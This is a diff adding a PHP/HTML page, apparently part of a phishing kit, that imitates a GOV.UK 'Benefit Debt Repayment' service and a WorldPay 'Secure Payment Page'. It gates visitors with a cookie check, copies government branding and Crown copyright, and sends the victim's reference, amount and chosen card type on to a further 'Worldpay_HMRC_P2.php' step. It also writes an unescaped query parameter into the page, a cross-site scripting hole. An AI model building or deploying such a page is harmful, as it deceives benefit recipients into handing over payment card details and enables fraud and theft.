@@ -1,0 +1,531 @@
+<?php 
+ob_start();
+if(!isset($_COOKIE['accessCookie'])) {
+  header('location: /');
+}
+ob_end_flush();
+
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- layout.templ $Revision$ -->
+<html lang="en">
+<head>
+<meta http-equiv=Cache-Control CONTENT="no-cache,no-store">
+<meta http-equiv=Pragma CONTENT="no-cache">
+<meta http-equiv=Expires CONTENT="Thu, 01 Jan 1970 00:00:00 GMT">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Welcome to WorldPay</title>
+<style type="text/css">
+
+table tr td, table tr td span {
+	font-family: "nta", Arial, sans-serif!important;
+	color: #0b0c0c!important;
+	font-size:19px!important;
+}
+
+table tr td h2 {
+	font-weight: bold;
+}
+
+table tr td.error {
+	text-align: left;
+}
+
+table tr td.error span {
+	color:#f00!important;
+}
+
+.cardlabel {
+	padding: 20px;
+  	background-color: #eee;
+}
+
+.cardlabel td {
+	float: left;
+}
+
+@media (max-width: 767px) {
+	.cardlabel td span {
+		font-size: 12px!important;
+	}
+}
+
+.cardlabel table {
+	margin-left: auto;
+	margin-right: auto;
+	width: 100%;
+}
+
+@media (min-width: 769px) {
+	.cardlabel td {
+		padding: 0 20px;
+		display: block;
+	}
+
+	.cardlabel td:first-child {
+		padding-left: 0;
+	}
+}
+
+.cardlabel td a {
+	display: block;
+	clear: both;
+}
+
+.cardlabel td img {
+	margin-bottom:-15px;
+}
+
+.cardlabel + td {
+	display: none;
+}
+
+form {
+	padding:15px;
+	border:1px solid #bbb;
+	margin-top: 30px;
+}
+
+@media(max-width: 767px) {
+  form h1 {
+    font-size: 32px;
+    line-height: 1em;
+  }
+}
+
+input#op-DPCancel {
+	display: none;
+}
+
+label[for="op-DPCancel"] {
+	display: block;
+	float: none;
+	clear: both;
+	padding: 10px 20px;
+	color: #fff;
+	background:#999;
+	margin: 0 auto 20px;
+	cursor: pointer;
+	text-align: center;
+	width:30%;
+}
+
+@media (min-width: 769px) {
+	label[for="op-DPCancel"] {
+		max-width:100px;
+	}
+}
+
+label[for="op-DPCancel"] span b {
+	color: #fff;
+}
+
+@media (min-width: 769px) {
+	.repayments form {
+		width: 66%;
+	}
+}
+
+@media print {
+	body {font-size:100%; width: 100%; margin: 0; float: none; font-family:Times New Roman, Serif; color: #000000; background: #ffffff;}
+	table.header {display:none; width: 100%;}
+	td.headerlogo1 {display:none;}
+	td.headerlogo2 {display:none;}
+	table.nav {display:none; width: 100%;}
+	table.container {background-color: #ffffff; width: 100%;}
+	td.title {background-color: #ffffff; color: #000000; width: 100%;}
+	table.containercell {background-color: #ffffff; width: 100%;}
+	A.header:Link {display:none;}
+	A.header:Visited {display:none;}
+	A.header:Active {display:none;}
+	A.header:Hover {display:none;}
+	hr {color: #000000; background-color: #000000; height: 1px;}
+	td.footerdivider {display:none; width: 100%;}
+	td.footer {display:none; width: 100%;}
+	td.brand {display:none;}
+	.print_buttons {display:none;}
+	#print_buttons tr{display:none;}
+	div.print_buttons {display:none;}
+	img.print_buttons {display:none;}
+}
+
+</style>
+<script type="text/javascript">      (function(){if(navigator.userAgent.match(/IEMobile\/10\.0/)){var d=document,c="appendChild",a=d.createElement("style");a[c](d.createTextNode("@-ms-viewport{width:auto!important}"));d.getElementsByTagName("head")[0][c](a);}})();    </script>
+<!--[if gt IE 8]><!--><link href="https://assets.digital.cabinet-office.gov.uk/static/govuk-template-6820d35a129a3ffde628d8447156c5dc.css" media="screen" rel="stylesheet" type="text/css">
+<!--<![endif]--><!--[if IE 6]><link href="https://assets.digital.cabinet-office.gov.uk/static/govuk-template-ie6-4ce1b714659f23f4b262761bb2410b40.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if IE 7]><link href="https://assets.digital.cabinet-office.gov.uk/static/govuk-template-ie7-5dacabc4c21165dd2db29145e15eb57c.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if IE 8]><link href="https://assets.digital.cabinet-office.gov.uk/static/govuk-template-ie8-0153d61aaa359828709c0429cb331cfe.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><link href="https://assets.digital.cabinet-office.gov.uk/static/govuk-template-print-95606431bbfe23b0e4ee9e5ed3346c47.css" media="print" rel="stylesheet" type="text/css">
+<!--[if IE 8]>
+    <script type="text/javascript">
+      (function(){if(window.opera){return;}
+       setTimeout(function(){var a=document,g,b={families:(g=
+       ["nta"]),urls:["https://assets.digital.cabinet-office.gov.uk/static/fonts-ie8-1e4512e11cb3ee77b91f723129629e95.css"]},
+       c="https://assets.digital.cabinet-office.gov.uk/static/vendor/goog/webfont-debug-96870cf9f159ed811fd43c39bdf4656b.js",d="script",
+       e=a.createElement(d),f=a.getElementsByTagName(d)[0],h=g.length;WebFontConfig
+       ={custom:b},e.src=c,f.parentNode.insertBefore(e,f);for(;h=h-1;a.documentElement
+       .className+=' wf-'+g[h].replace(/\s/g,'').toLowerCase()+'-n4-loading');},0)
+      })()
+    </script>
+    <![endif]--><!--[if gte IE 9]><!--><link href="https://assets.digital.cabinet-office.gov.uk/static/fonts-83e596ae63d072e22b7f34d2b5482bde.css" media="all" rel="stylesheet" type="text/css">
+<!--<![endif]--><!--[if lt IE 9]>
+      <script src="https://assets.digital.cabinet-office.gov.uk/static/ie-fc5bd25c5f46587b9bff917417ab2b7f.js" type="text/javascript"></script>
+    <![endif]--><link rel="shortcut icon" href="https://assets.digital.cabinet-office.gov.uk/static/favicon-9269d2d9f40d20236f60a3dbc448679a.ico" type="image/x-icon">
+<!-- Size for iPad and iPad mini (high resolution) --><link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://assets.digital.cabinet-office.gov.uk/static/apple-touch-icon-152x152-58591dcff066ba321b89a9e208ccedab.png">
+<!-- Size for iPhone and iPod touch (high resolution) --><link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://assets.digital.cabinet-office.gov.uk/static/apple-touch-icon-120x120-b6a680ead8eb531b9c28cc056836ad06.png">
+<!-- Size for iPad 2 and iPad mini (standard resolution) --><link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://assets.digital.cabinet-office.gov.uk/static/apple-touch-icon-76x76-17dd3f1e168561f9099ba92e3292e607.png">
+<!-- Default non-defined size, also used for Android 2.1+ devices --><link rel="apple-touch-icon-precomposed" href="https://assets.digital.cabinet-office.gov.uk/static/apple-touch-icon-60x60-dc9aa421bedcf2c08c4e8f3f230f780d.png">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:image" content="https://assets.digital.cabinet-office.gov.uk/static/opengraph-image-85fc698c83c77d8d8cb5467a44cc12a5.png">
+<!--[if gt IE 8]><!--><link href="https://assets.digital.cabinet-office.gov.uk/static/static-e826b001509ad8acb5293bc8dfb7c7a9.css" media="screen" rel="stylesheet" type="text/css">
+<!--<![endif]--><!--[if IE 6]><link href="https://assets.digital.cabinet-office.gov.uk/static/static-ie6-5be111e96e185115bbfa4bec0ea02f2f.css" media="screen" rel="stylesheet" type="text/css" /><script>var ieVersion = 6;</script><![endif]--><!--[if IE 7]><link href="https://assets.digital.cabinet-office.gov.uk/static/static-ie7-df9f4756ea346d9ecaa2c7128930fbd1.css" media="screen" rel="stylesheet" type="text/css" /><script>var ieVersion = 7;</script><![endif]--><!--[if IE 8]><link href="https://assets.digital.cabinet-office.gov.uk/static/static-ie8-aef6a13db6843fa6e7670ddf7d57c62c.css" media="screen" rel="stylesheet" type="text/css" /><script>var ieVersion = 8;</script><![endif]--><link href="https://assets.digital.cabinet-office.gov.uk/static/print-885c0e730d8d8e704542e8304c523b9b.css" media="print" rel="stylesheet" type="text/css">
+<link title="Search" rel="search" type="application/opensearchdescription+xml" href="/search/opensearch.xml">
+<!--[if gt IE 8]><!--><link href="https://assets.digital.cabinet-office.gov.uk/frontend/application-fbe1508997c4ebf8fa624d2e1db1fb80.css" media="screen" rel="stylesheet" type="text/css">
+<!--<![endif]--><link rel="canonical" href="/">
+<meta name="description" content="GOV.UK - The place to find government services and information - Simpler, clearer, faster">
+<!--[if IE 6]><link href="https://assets.digital.cabinet-office.gov.uk/frontend/application-ie6-a34832352e383884edc89454b7e29b04.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if IE 7]><link href="https://assets.digital.cabinet-office.gov.uk/frontend/application-ie7-7f2f952f522ba46f674b44af0a98a067.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if IE 8]><link href="https://assets.digital.cabinet-office.gov.uk/frontend/application-ie8-76ab79c4381c45c614f886802ec6578c.css" media="screen" rel="stylesheet" type="text/css" /><![endif]-->
+<link href="/custom.css" rel="stylesheet" type="text/css">
+</head><body class="mainstream">    <script type="text/javascript">document.body.className = ((document.body.className) ? document.body.className + ' js-enabled' : 'js-enabled');</script><div id="skiplink-container">      <div>        <a href="#content" class="skiplink">Skip to main content</a>      </div>    </div>        <!--end global-cookie-message-->    
+<header role="banner" id="global-header" class=""><div class="header-wrapper">
+        <div class="header-global">
+          <div class="header-logo">
+            <a href="https://www.gov.uk/" title="Go to the GOV.UK homepage" id="logo" class="content">
+              <img src="https://assets.digital.cabinet-office.gov.uk/static/gov.uk_logotype_crown-c09acb07e4d1d5d558f5a0bc53e9e36d.png" width="35" height="31" alt=""> GOV.UK
+            </a>
+          </div>
+          <div class="header-proposition">
+            <div class="content">
+              <nav id="proposition-menu">
+                <a href="start.htm" id="proposition-name">Benefit Debt Repayment</a>
+              </nav>
+            </div>
+          </div>
+        </div>
+        
+      </div>
+    
+    </header><!--end header-->         
+    <div id="top-links" class="inner-block">                    </div>		       <!--end global-header-bar--> </body></html>
+    <div id="global-header-bar">
+      <div class="inner-block">
+        <div class="header-bar"></div>
+      </div>
+    </div>
+
+   <div id="wrapper" class="transaction service">
+      
+<main id="content" role="main" class="group">
+   
+    <div class="phase-banner-alpha">
+    <p>
+      <strong class="phase-tag">ALPHA</strong>
+      <span>This is a new service – your <a href="#">feedback</a> will help us to improve it.</span>
+    </p>
+  </div>
+  <div class="repayments">  
+<script type="text/javascript">	
+ var v1 = parent.document.URL.substring(parent.document.URL.indexOf('?'), parent.document.URL.length);	
+var qsParm = new Array();
+var query = window.location.search.substring(1);
+var parms = query.split('&');
+for (var i=0; i<parms.length; i++) {
+var pos = parms[i].indexOf('=');
+if (pos > 0) {
+var key = parms[i].substring(0,pos);
+var val = parms[i].substring(pos+1);
+if(key==='refID'){
+ var refVal = val;
+ }
+ if(key==='Amount'){
+ var uamt = parseFloat(val);
+ amt=uamt.toFixed(2);
+ }
+//salert(val);
+//alert(qsParm[key]);
+}
+}
+function completeAndRedirect(){
+location.href = "./Worldpay_HMRC_P2.php?refID="+refVal+"&Amount="+amt;
+
+}
+function sendCardType(value){
+
+location.href = "./Worldpay_HMRC_P2.php?refID="+refVal+"&Amount="+amt+"&CardType="+value;
+
+}
+</script>
+
+<form action="javascript:completeAndRedirect();" method="post" autocomplete="off">
+	
+	<br>
+	
+<table class="container" cellpadding="0" cellspacing="0" align="center">
+	<tbody><tr>
+		<td>
+			<!-- the main content table -->
+			<table class="containercell" cellspacing="0" cellpadding="2">
+				<tbody><tr>
+					<td class="title" colspan="2">
+						<!-- page title -->
+						<h1>Secure Payment Page</h1>
+						<!--  end page title -->
+					</td>
+				</tr>
+<!-- end tableHead.html -->	
+
+<!-- dispPage.templ $Revision$ -->
+<!--WP start dispatcher/dispPage -->
+<input type="hidden" name="PaymentID" value="ukdc1-pz-cen07-dppr-1422371614386">
+
+
+
+<!--WP start testModeMessage -->
+
+<tr>
+	<td colspan="2" class="error" align="center"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #FF0000;">TEST MODE - This is not a live transaction.</span></td>
+</tr>
+
+<!--WP end testModeMessage -->
+
+<!--WP Intro text -->
+<tr>
+	<td colspan="2" class="one" align="left"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #002469;">Please review your purchase details, then select a payment method to continue.</span></td>
+</tr>
+<!--WP Intro text -->
+
+<!--WP Feedback messages - uses comp.dispatcher.error etc. -->
+
+<!--WP end Feedback messages -->
+
+<!--WP Details -->
+<tr>
+	<td colspan="2" class="one">
+		<table cellpadding="0" cellspacing="0" border="0">
+
+		<!--WP language select -->
+
+<!--WP language select -->
+
+
+		
+		<!-- BIBIT country select -->
+		
+
+<!--WP currency drop down -->
+	
+	
+		<input type="hidden" name="authCurrency" value="GBP">
+	
+<!--WP end currency drop down -->
+
+<!--WP Description -->
+			
+<!--WP END Description -->
+
+<!--WP FuturePay -->
+	
+
+	
+		<tbody><tr>
+			<td class="one width190" align="left" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #002469;">Description</span>&nbsp;&nbsp;</td>
+			<td class="one" align="left" valign="top">
+	<span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #002469;"><b><script type="text/javascript">
+document.write(refVal);
+
+</script></b></span></td></tr>
+	
+	
+	
+	
+		<tr>
+			<td class="one width190" align="left" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #002469;">Amount</span>&nbsp;&nbsp;</td>
+			<td class="one width190" align="left" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #002469;"><b>GBP <script type="text/javascript">
+document.write(amt);
+
+</script></b></span></td>
+		</tr>
+	
+
+<!--WP RFP attributes-->
+	
+<!--WP RFP END-->
+
+<!--WP LFP attributes-->
+	
+<!--WP END LFP -->
+
+	
+<!--WP END FP -->		
+		</tbody></table>
+	</td>
+</tr>
+
+<!--WP END Details -->
+
+<!-- start Bibit Order Contents -->
+
+
+<!-- end Bibit Order Contents -->
+<!--WP spacer row -->
+<!--WP end spacer row -->
+<!--WP clickable card logos -->
+	<tr valign="middle">
+		<td colspan="2" class="one" align="left">
+			<div class="print_buttons">
+				</div><table width="100%" cellpadding="0" cellspacing="0" border="0">
+				<tbody><tr>
+					<td class="three" align="left" valign="middle"><h2>&nbsp;Select your payment method</h2></td>
+					<td class="one" align="right"><a href="#" target="_blank" title="Choose your payment method. Opens in a new window. - Opens in a new window"><img src="./help.gif" alt="Choose your payment method. Opens in a new window." style="border:0px;" class="print_buttons"></a></td>
+				</tr>
+				<tr>
+					<td class="two" align="left">
+						
+									
+</td></tr><tr id="cardGroupHeadingselected">
+ 	<td class="two" align="left">&nbsp;<span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #002469;"><b>Cards</b></span></td>
+ 	<td class="one" align="center">&nbsp;</td>
+</tr>
+
+<tr>
+ 	<td class="cardlabel" align="center">
+ 		<table cellpadding="2" cellspacing="3" border="0">
+ 			<tbody><tr>
+				<td align="center" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #000000;"><a href="javascript:sendCardType('MasterCard');"><img name="op-DPChoose-ECMC^SSL" src="./mastercard.gif" alt="MasterCard"></a><br>MasterCard</span></td>
+ 				<td align="center" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #000000;"> <a href="javascript:sendCardType('Visa');"><img name="op-DPChoose-VISA^SSL" src="./VISA.gif" alt="Visa"> </a><br>Visa</span></td>										
+ 				<td align="center" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #000000;"><a href="javascript:sendCardType('Maestro');"><img name="op-DPChoose-MAESTRO^SSL" src="./maestro.gif" alt="Maestro"> </a> <br>Maestro</span></td>
+ 				<td align="center" valign="top"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #000000;"><a href="javascript:sendCardType('JCB');"><img name="op-DPChoose-JCB^SSL" src="./JCB.gif" alt="JCB"> </a><br>JCB</span></td>
+			</tr>
+		</tbody></table>
+ 	</td> 	
+ 	<td class="one" align="center">&nbsp;</td>
+</tr>
+
+
+							  
+									
+<!--<tr id="noncardGroupHeadingselected">
+ 	<td class="two" align="left">&nbsp;<span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 10pt; color: #002469;"><b>Alternative payments</b></span></td>
+ 	<td class="one" align="center">&nbsp;</td>
+</tr>
+
+<tr>
+ 	<td class="cardlabel" align="center">
+ 		<table cellpadding="2" cellspacing="3" border="0">
+ 			<tr>
+				<td align="center" valign="top"><input name="op-DPChoose-TRANSFER_GB^BANK" type="image" src="/images/logos/TRANSFER_GB.gif" alt="Bank transfer - UK" /><br /><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #000000;">Bank transfer - UK</span></td>
+				<td align="center" valign="top"></td>
+ 				<td align="center" valign="top"></td>										
+ 				<td align="center" valign="top"></td>										
+ 				<td align="center" valign="top"></td>
+ 				<td align="center" valign="top"></td>
+			</tr>
+		</table>
+ 	</td> 	
+ 	<td class="one" align="center">&nbsp;</td>
+</tr> -->
+
+							  
+					
+					<tr><td class="one" align="center">&nbsp;</td>
+				</tr>
+<!--WP cancel button -->
+<tr>
+					<td class="three" align="right"><label for="op-DPCancel"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 12pt; color: #FFFFFF;"><b>Cancel</b></span></label>&nbsp;</td>
+					<td class="one" align="left"><input name="op-DPCancel" id="op-DPCancel" type="image" src="./cancelcross.gif" alt="Cancel"></td>
+				</tr>
+
+<!--WP end cancel button -->
+			</tbody></table>
+		</td>		
+	</tr>
+<!--WP end clickable card logos -->
+
+<!-- WP brand logo -->
+<!-- start brand.comp -->	
+			<tr>
+				<td colspan="2" class="brand">
+					<table width="100%" cellpadding="0" cellspacing="0" border="0">
+						<tbody><tr>
+							<td class="brand" width="150">
+							<a href="http://www.worldpay.com" target="_blank" title="Opens in a new window"><img src="./brandworldpay.gif" alt="Powered by WorldPay" border="0"></a>
+							</td>
+							<td class="brand"><span style=" font-family: Verdana,Geneva,Arial,Helvetica,Sans-Serif; font-size: 8pt; color: #000000;">For help with your payment visit the: <a href="/global3/brands/worldpay/payment/fixed/help_brand_en.html" target="_blank" title="WorldPay Help - Opens in a new window" class="brand">WorldPay Help</a>.</span></td>
+						</tr>
+						<tr>
+						<td>&nbsp;&nbsp;</td>
+						</tr>
+						<tr>
+						<td>&nbsp;&nbsp;</td>
+						</tr>
+					</tbody></table>
+				</td>
+			</tr>
+<!-- end brand.comp -->	
+
+<!-- WP brand logo -->
+
+<script type="text/javascript">
+
+	var selectBox=document.getElementsByName("authCurrency")[0];
+	if(selectBox){	
+		selectBox.onchange = function(){
+		document.getElementById("op-Currency").click();
+		};
+	}
+</script> 
+
+<!--WP end dispatcher/dispPage -->
+
+
+
+
+						</tbody></table>
+					</td>
+				</tr>
+			</tbody></table>
+
+</form>
+
+     
+</main>
+</div>   
+<footer class="group js-footer" id="footer" role="contentinfo">
+        <div class="footer-wrapper">
+            <div class="footer-meta">
+                <div class="footer-meta-inner">
+                    <ul>
+                        <li>
+                            <a href="cookies.aspx" target="_blank">Cookies</a>
+                        </li>
+                        <li>
+                            <a href="terms.aspx" target="_blank">Terms and Conditions</a>
+                        </li>
+                        <li>
+                            <a id="butEnglish" title="Click to view this site in English" href="javascript:__doPostBack('ctl00$butEnglish','')">English</a>
+                        </li>
+                        <li>
+                            <a id="butWelsh" title="Cliciwch i weld y safle hwn yn y Gymraeg" href="javascript:__doPostBack('ctl00$butWelsh','')">Welsh</a>
+                        </li>
+                        <li>
+                            Built by the <a href="https://dvladigital.blog.gov.uk/">Driver &amp; Vehicle Licensing Agency</a> 
+                        </li>
+                    </ul>
+                    <div class="open-government-licence">
+                        <p class="logo"><a href="https://www.nationalarchives.gov.uk/doc/open-government-licence/version/2/">Open Government Licence</a></p>
+                        <!--<h2>
+                            <a href="http://www.nationalarchives.gov.uk/doc/open-government-licence/version/2">
+                                <img src="https://www.assets.vehicleenquiry.service.gov.uk/vehicleenquiry/Assets/Images/open-government-licence_2x-d273d7eca3045d3b710a863d9bfc0b33.png"
+                                    alt="OGL"></a></h2>-->
+                        <p>
+                            All content is available under the <a href="http://www.nationalarchives.gov.uk/doc/open-government-licence/version/2">
+                                Open Government Licence v2.0</a>, except where otherwise stated</p>
+                    </div>
+                </div>
+                <div class="copyright">
+                    <a href="http://www.nationalarchives.gov.uk/information-management/our-services/crown-copyright.htm">
+                        © Crown copyright</a>
+                </div>
+            </div>
+        </div>
+    </footer><!--end footer-->
+
+<div id="global-app-error" class="app-error hidden"></div>    <script src="https://assets.digital.cabinet-office.gov.uk/static/govuk-template-1d29c0379552e7f7ab67500dea47df2d.js" type="text/javascript"></script><script src="https://assets.digital.cabinet-office.gov.uk/static/libs/jquery/jquery-1.7.2-2ce4706f8f7193defaa9e7df2b641e9a.js" type="text/javascript"></script><script src="https://assets.digital.cabinet-office.gov.uk/static/application-c784d6077a9fa03890364983e9120d91.js" type="text/javascript"></script><script id="ga-params" type="text/javascript">  window.GOVUK = window.GOVUK || {};  GOVUK.Analytics = GOVUK.Analytics || {};  var _gaq = _gaq || [];  _gaq.push(['_setAccount', 'UA-26179049-1']);  if(document.domain=='www.gov.uk') {    _gaq.push(['_setDomainName', '.www.gov.uk']);  } else {    _gaq.push(['_setDomainName', document.domain]);  }  _gaq.push(['_setAllowLinker', true]);    // track pixel density ratio  if (window.devicePixelRatio) {    _gaq.push(['_setCustomVar', 11, 'Pixel Ratio', String(window.devicePixelRatio), 2 ]);  }  // Search result placement tracking, set custom var and destroy the cookie  if(GOVUK.cookie && GOVUK.cookie('ga_nextpage_params') !== null){    var customVar = GOVUK.cookie('ga_nextpage_params').split(',');    customVar[1] = parseInt(customVar[1], 10);    customVar[4] = parseInt(customVar[4], 10);    _gaq.push(customVar);    GOVUK.cookie('ga_nextpage_params', null);  }_gaq.push(["_setCustomVar",1,"Section","crime, justice and the law",3]);GOVUK.Analytics.Section = "crime, justice and the law";_gaq.push(["_setCustomVar",4,"Proposition","citizen",3]);GOVUK.Analytics.Proposition = "citizen";_gaq.push(["_setCustomVar",2,"Format","transaction",3]);GOVUK.Analytics.Format = "transaction";</script><script type="text/javascript">  _gaq.push(['_gat._anonymizeIp']);  _gaq.push(['_trackPageview']);  (function() {    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);  })();</script><script src="https://assets.digital.cabinet-office.gov.uk/frontend/frontend-3da91097eaed5589a6492d6be5bd1fee.js" type="text/javascript"></script></body></html>
+
+</html>
